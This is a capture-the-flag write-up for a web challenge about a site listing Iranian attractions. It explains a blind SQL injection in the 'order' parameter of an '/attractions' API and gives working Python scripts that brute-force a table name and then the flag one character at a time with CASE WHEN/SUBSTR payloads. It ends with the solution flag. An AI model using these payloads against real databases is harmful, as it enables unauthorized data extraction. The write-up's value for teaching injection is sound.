# The Data Whisperer


**Which of Iran's attractions have you seen?**
To begin your investigation and uncover the secrets hidden within, visit [sam.uctf.ir](https://sam.uctf.ir/). Your journey starts here!


# Write Up

In this challenge, you'll be exploiting a **blind SQL injection vulnerability** in an API that powers a website displaying famous attractions of Iran. Your goal is to extract a hidden flag stored in the database by taking advantage of an unsanitized input in the `order` parameter of the `/attractions` API.

### Overview:

The vulnerable API accepts user input to sort attractions by various fields like `name` or `count`, but it fails to properly sanitize the input before including it in a SQL query. This leaves the API susceptible to SQL injection, allowing attackers to manipulate the query and extract data from the database.

Your objective is to:
1. Discover the **name of the table** containing the flag, which starts with `flag_`.
2. Extract the **value of the flag** stored within that table.

To successfully solve this challenge, you’ll need to craft SQL payloads using conditional logic (`CASE WHEN`) and utilize the `SUBSTR` function to brute-force both the table name and the flag value one character at a time.

Let's dive into the exploitation process and retrieve that flag!


### Part 1: Finding the Table Name

This code bruteforces the table name by testing each character of the table name (which starts with `flag`), using the `SUBSTR` SQL function in a blind SQL injection payload.

```python
import requests

URL = "http://website-url.com/attractions"
headers = {"Content-Type": "application/json"}

# Function to brute-force the table name
def brute_force_table_name():
    table_name = ""
    position = 1  # Start at the first character position
    found_flag = False

    while not found_flag:
        found_character = False
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}":  # Possible characters in the table name
            payload = {
                "order": f"(CASE WHEN (SELECT SUBSTR(name,{position},1) FROM sqlite_master WHERE type='table' AND name LIKE 'flag%')='{char}' THEN count ELSE id END) DESC"
            }
            response = requests.post(URL, json=payload, headers=headers)
            
            # Check if the payload was successful
            if response.json()[0]["id"] == 1:
                table_name += char
                print(f"Found character {char} at position {position}")
                position += 1
                found_character = True
                break
        
        if not found_character:
            found_flag = True

    return table_name

table_name = brute_force_table_name()
print(f"Table name: {table_name}")
```


### Part 2: Finding the Value of the Flag

Once the table name has been identified (which should be something like `flag_xyz`), you can use a similar approach to brute-force the value of the `flag` stored in that table.

```python
# Function to brute-force the flag value
def brute_force_flag_value(table_name):
    flag_value = ""
    position = 1  # Start at the first character position
    found_flag = False

    while not found_flag:
        found_character = False
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}":  # Possible characters in the flag
            payload = {
                "order": f"(CASE WHEN (SELECT SUBSTR(flag,{position},1) FROM {table_name})='{char}' THEN count ELSE id END) DESC"
            }
            response = requests.post(URL, json=payload, headers=headers)
            
            # Check if the payload was successful
            if response.json()[0]["id"] == 1:
                flag_value += char
                print(f"Found character {char} at position {position}")
                position += 1
                found_character = True
                break
        
        if not found_character:
            found_flag = True

    return flag_value

flag_value = brute_force_flag_value(table_name)
print(f"Flag value: {flag_value}")
```

### Explanation:

1. **Brute-forcing the Table Name**: 
   - The payload used is: `"(CASE WHEN (SELECT SUBSTR(name,{position},1) FROM sqlite_master WHERE type='table' AND name LIKE 'flag%')='{character}' THEN count ELSE id END) DESC"`
   - The code iterates over possible characters in the table name, testing one character at a time and checking if the response differs, which indicates that the character is correct.

2. **Brute-forcing the Flag Value**:
   - The payload used is: `"(CASE WHEN (SELECT SUBSTR(flag,{position},1) FROM {table_name})='{character}' THEN count ELSE id END) DESC"`
   - After identifying the table name, the code similarly brute-forces each character of the flag value stored in the table.

### Write-up Conclusion:

- This SQL injection vulnerability exists due to unsanitized input in the `ORDER BY` clause of the SQL query.
- By sending crafted SQL injection payloads via the `/attractions` API call, it's possible to extract both the table name (which starts with `flag`) and the flag value.
- The payloads are crafted to use the `SUBSTR` function in combination with conditional logic (`CASE WHEN`), which allows us to determine each character of the target string one by one.




# Flag


```
UCTF{74kh73_5013ym4n_4nc13n7_w0nd325}
```

# Categories

- [X] Web
- [ ] Reverse
- [ ] PWN
- [ ] Misc
- [ ] Forensics
- [ ] Cryptography
- [ ] Steganography
- [ ] Android

# Points

| Warm up | This Challenge  | Evil |
| ------- |:---------------:| ----:|
| 25      |  	  250		| 500  |
